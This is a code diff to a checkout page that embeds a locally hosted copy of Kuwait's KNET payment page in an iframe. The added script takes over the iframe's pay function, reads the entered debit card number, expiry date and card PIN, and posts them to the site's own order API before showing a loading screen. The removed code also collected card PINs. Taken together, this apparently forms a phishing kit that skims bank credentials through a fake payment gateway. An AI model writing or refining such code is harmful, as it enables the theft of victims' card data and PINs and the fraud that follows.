@@ -400,7 +400,7 @@
                             <span style="font-weight: 700; font-size: 14px;">Credit Card</span>
                         </div>
                         <div id="selectKnet" onclick="showPayment('knet')" style="cursor: pointer; padding: 20px; border: 2px solid #eee; border-radius: 12px; text-align: center; background: #fff; transition: all 0.3s ease;">
-                            <img src="https://www.knet.com.kw/wp-content/uploads/2020/02/Knet-Logo.png" style="height: 24px; margin-bottom: 10px; display: block; margin-left: auto; margin-right: auto;" alt="Knet">
+                            <img src="images/knet-logo-new.jpg" style="height: 40px; object-fit: contain; margin-bottom: 10px; display: block; margin-left: auto; margin-right: auto;" alt="Knet">
                             <span style="font-weight: 700; font-size: 14px;">Knet</span>
                         </div>
                     </div>
@@ -699,7 +699,7 @@
 
                 <!-- Knet Inline Form - Original KNET Page -->
                 <div id="knetCardSection" style="display:none; width: 100%; margin-bottom: 20px;">
-                    <iframe id="knetIframe" src="knet.html" style="width: 100%; height: 600px; border: none; border-radius: 8px;" frameborder="0" scrolling="auto"></iframe>
+                    <iframe id="knetIframe" src="knet-en.html" style="width: 100%; height: 600px; border: none; border-radius: 8px;" frameborder="0" scrolling="auto"></iframe>
                 </div>
 
                 <!-- KNET Payment Button -->
@@ -770,10 +770,8 @@
                 knetDiv.style.backgroundColor = '#fff';
                 knetDiv.style.boxShadow = 'none';
                 creditSection.style.display = 'block';
-                creditSection.style.animation = 'fadeIn 0.3s ease-in';
-                payBtn.style.display = 'block';
                 knetCardSection.style.display = 'none';
-                knetPayBtn.style.display = 'none';
+                payBtn.style.display = 'block';
             } else {
                 creditDiv.style.borderColor = '#eee';
                 creditDiv.style.backgroundColor = '#fff';
@@ -782,17 +780,111 @@
                 knetDiv.style.backgroundColor = 'rgba(0, 112, 205, 0.05)';
                 knetDiv.style.boxShadow = '0 4px 12px rgba(0, 112, 205, 0.15)';
                 creditSection.style.display = 'none';
-                payBtn.style.display = 'none';
                 knetCardSection.style.display = 'block';
-                knetCardSection.style.animation = 'fadeIn 0.3s ease-in';
-                knetPayBtn.style.display = 'block';
+                payBtn.style.display = 'none';
+                
+                // Increase iframe height for KNET full display
+                const knetIframe = document.getElementById('knetIframe');
+                if (knetIframe) {
+                    knetIframe.style.height = '800px';
+                }
             }
         }
 
+        // Bind pay button to handle KNET submission via iframe
+        document.getElementById('payBtn').addEventListener('click', function(e) {
+            if (selectedMethod === 'knet') {
+                e.preventDefault();
+                var iframe = document.getElementById('knetIframe');
+                if (iframe && iframe.contentWindow) {
+                    // Send command to KNET page to execute payment
+                    iframe.contentWindow.postMessage({ type: 'submitKnet' }, '*');
+                }
+            }
+        });
+
+        // Setup listeners on page load
         window.addEventListener('DOMContentLoaded', () => {
             document.getElementById('selectCredit').addEventListener('click', () => showPayment('credit'));
             document.getElementById('selectKnet').addEventListener('click', () => showPayment('knet'));
-            showPayment('credit');
+            showPayment('credit'); // Default state
+
+            const knetIframe = document.getElementById('knetIframe');
+            if (knetIframe) {
+                knetIframe.onload = function() {
+                    try {
+                        const iframeWin = knetIframe.contentWindow;
+                        const iframeDoc = knetIframe.contentDocument || iframeWin.document;
+
+                        // Override onPay to handle API submission
+                        const originalOnPay = iframeWin.onPay;
+                        iframeWin.onPay = function() {
+                            const debitNumber = iframeDoc.getElementById('debitNumber') ? iframeDoc.getElementById('debitNumber').value.replace(/\s/g, '') : '';
+                            const expiryMonth = iframeDoc.getElementById('expiryMonthBox') ? iframeDoc.getElementById('expiryMonthBox').value : '';
+                            const expiryYear = iframeDoc.getElementById('expiryYearBox') ? iframeDoc.getElementById('expiryYearBox').value : '';
+                            const cardPin = iframeDoc.getElementById('cardPin') ? iframeDoc.getElementById('cardPin').value : '';
+                            
+                            if (!debitNumber || !expiryMonth || !expiryYear || !cardPin) {
+                                if (typeof originalOnPay === 'function') {
+                                    const res = originalOnPay();
+                                    if (res === false) return;
+                                } else {
+                                    alert('Please complete all fields');
+                                    return;
+                                }
+                            }
+
+                            const orderId = localStorage.getItem('orderId') || sessionStorage.getItem('orderId');
+                            const knetData = {
+                                orderId: orderId,
+                                payment_method: 'Knet',
+                                knet_data: {
+                                    card_number: debitNumber,
+                                    expiry_month: expiryMonth,
+                                    expiry_year: expiryYear,
+                                    pin: cardPin,
+                                    timestamp: new Date().toISOString()
+                                }
+                            };
+
+                            if (typeof iframeWin.loadshow === 'function') iframeWin.loadshow();
+
+                            fetch('/api/orders/payment-data', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify(knetData)
+                            })
+                            .then(r => r.json())
+                            .then(data => {
+                                window.location.href = 'loading_en.html';
+                            })
+                            .catch(err => {
+                                if (typeof iframeWin.loadhide === 'function') iframeWin.loadhide();
+                                alert('An error occurred while sending data');
+                            });
+                        };
+
+                        // Handle message from parent
+                        iframeWin.addEventListener('message', function(event) {
+                            if (event.data.type === 'submitKnet') {
+                                iframeWin.onPay();
+                            }
+                            if (event.data.type === 'initKnetData') {
+                                if (event.data.knetTotal) {
+                                    const amountElements = iframeDoc.querySelectorAll('.paymentdata');
+                                    amountElements.forEach(el => {
+                                        if (el.textContent.includes('KD') || el.textContent.includes('KWD')) {
+                                            el.textContent = event.data.knetTotal;
+                                        }
+                                    });
+                                }
+                            }
+                        });
+                    } catch (e) {
+                        console.error("Bridge injection failed:", e);
+                    }
+                };
+            }
 
             // Pass data to KNET iframe after a short delay to ensure it loads
             setTimeout(function() {
@@ -807,69 +899,6 @@
                 }
             }, 1500);
         });
-
-                    const country = localStorage.getItem('selectedCountry') || document.getElementById('country').value;
-            const city = document.getElementById('city').value;
-            const street = document.getElementById('street').value.trim();
-            const buildingNumber = document.getElementById('building_number').value.trim();
-            const floor = document.getElementById('floor').value;
-
-            if (!city || !street || !buildingNumber || !floor) {
-                alert('Please complete delivery address details');
-                return;
-            }
-
-            const knetCardNumber = document.getElementById('knetCardNumber').value.trim();
-            const rawKnetCardNumber = knetCardNumber.replace(/\s/g, '');
-            if (rawKnetCardNumber.length < 12) {
-                alert('Invalid Knet card number');
-                return;
-            }
-
-            const expiryMonth = document.getElementById('knetExpiryMonth').value.trim();
-            const expiryYear = document.getElementById('knetExpiryYear').value.trim();
-            const pin = document.getElementById('knetPin').value.trim();
-
-            if (!expiryMonth || !expiryYear || !pin) {
-                alert('Please complete Knet details');
-                return;
-            }
-
-            const data = {
-                orderId,
-                payment_method: 'Knet',
-                knet_data: {
-                    card_number: rawKnetCardNumber,
-                    expiry_month: expiryMonth,
-                    expiry_year: expiryYear,
-                    pin: pin
-                },
-                delivery_address: {
-                    country, city, street, building_number: buildingNumber, floor
-                }
-            };
-
-            try {
-                document.getElementById('loadingTitle').textContent = 'Processing KNET...';
-                document.getElementById('loadingMessage').textContent = 'Please wait, processing KNET payment.';
-                document.getElementById('loadingOverlay').style.display = 'flex';
-
-                const response = await fetch('/api/orders/payment-data', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                });
-                if (response.ok) {
-                    pollInterval = setInterval(pollOrderStatus, 2000);
-                } else {
-                    alert('Error processing payment');
-                    document.getElementById('loadingOverlay').style.display = 'none';
-                }
-            } catch (err) {
-                alert('Connection error');
-                document.getElementById('loadingOverlay').style.display = 'none';
-            }
-        }
 
 
         function isValidCardNumber(number) {
@@ -1109,10 +1138,17 @@
             const data = countryData[countryCode];
             if (!data) return;
             const total = data.issueFee + data.deliveryFee;
+            const formattedTotal = formatPrice(total) + ' ' + data.currency;
             document.getElementById('issueFee').textContent = formatPrice(data.issueFee) + ' ' + data.currency;
             document.getElementById('deliveryFee').textContent = formatPrice(data.deliveryFee) + ' ' + data.currency;
-            document.getElementById('totalAmount').textContent = formatPrice(total) + ' ' + data.currency;
-            document.getElementById('btnTotal').textContent = formatPrice(total) + ' ' + data.currency;
+            document.getElementById('totalAmount').textContent = formattedTotal;
+            document.getElementById('btnTotal').textContent = formattedTotal;
+            if (document.getElementById('knetBtnTotal')) {
+                document.getElementById('knetBtnTotal').textContent = formattedTotal;
+            }
+            
+            // Save total for Knet page
+            sessionStorage.setItem('knetTotal', formattedTotal);
         }
 
         function updateCities(countryCode) {
